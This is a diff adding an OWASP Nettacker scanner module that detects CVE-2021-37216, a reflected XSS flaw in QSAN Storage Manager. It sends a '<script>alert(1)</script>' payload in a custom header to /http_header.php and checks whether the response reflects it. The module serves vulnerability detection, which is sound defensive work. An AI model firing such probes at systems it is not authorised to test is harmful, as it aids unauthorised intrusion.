@@ -1,0 +1,53 @@
+info:
+  name: qsan_storage_xss_cve_2021_37216_vuln
+  author: OWASP Nettacker Team
+  severity: 6
+  description: QSAN Storage Manager header page parameters does not filter special characters. Remote attackers can inject JavaScript without logging in and launch reflected XSS attacks to access and modify specific data.
+  reference: 
+    - https://www.twcert.org.tw/tw/cp-132-4962-44cd2-1.html
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - medium_severity
+    - cve2021
+    - cve
+    - qsan
+    - xss
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 3
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      - method: get
+        headers:
+          User-Agent: "{user_agent}"
+          X-Trigger-XSS: "<script>alert(1)</script>"
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/http_header.php"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            header:
+              Content-type: 
+                regex: text/html
+                reverse: false  
+            content:
+              regex: '"HTTP_X_TRIGGER_XSS":"<script>alert\(1\)<\/script>"'
+              reverse: false
